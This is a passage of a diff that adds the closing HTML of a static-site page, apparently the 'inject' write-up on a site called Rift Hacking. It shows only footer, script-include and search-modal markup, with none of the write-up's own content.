+      <script>
+        var oid = "views_writeups\/4. inject\/index.md"
+        var oid_likes = "likes_writeups\/4. inject\/index.md"
+      </script>
+      
+      
+      <script type="text/javascript" src="/js/page.min.b06a29d42a4ed16787978e2eee1e8c797b7698db2bc14ccee78f5c80ac566fc996190a73ad80a5e987558474b20b96fa38f7d85b405f165ff72b7b163c5ad11b.js" integrity="sha512-sGop1CpO0WeHl44u7h6MeXt2mNsrwUzO549cgKxWb8mWGQpzrYCl6YdVhHSyC5b6OPfYW0BfFl/3K3sWPFrRGw=="></script>
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+
+    
+  </footer>
+</article>
+
+      
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+    <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+      <ul class="flex flex-col list-none sm:flex-row">
+        
+        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/tags/"
+            title="">
+            
+            Tags
+          </a>
+        </li>
+        
+      </ul>
+    </nav>
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      © 2024 Rift Hacking. All Rights Reserved.
+    </p>
+    
+
+    
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.62060bb247f4de2b6dde45903668fefb68d792f365587605177b1227c0cf43588701edaca0cb40e2c8e2789bd5ce67c1d2a215b9fb258c3496a7cd25e7cb5fdf.js" integrity="sha512-YgYLskf03itt3kWQNmj&#43;&#43;2jXkvNlWHYFF3sSJ8DPQ1iHAe2soMtA4sjieJvVzmfB0qIVufsljDSWp80l58tf3w=="></script>
+  
+  
+</footer><div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="https://rifthacking.pages.dev/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
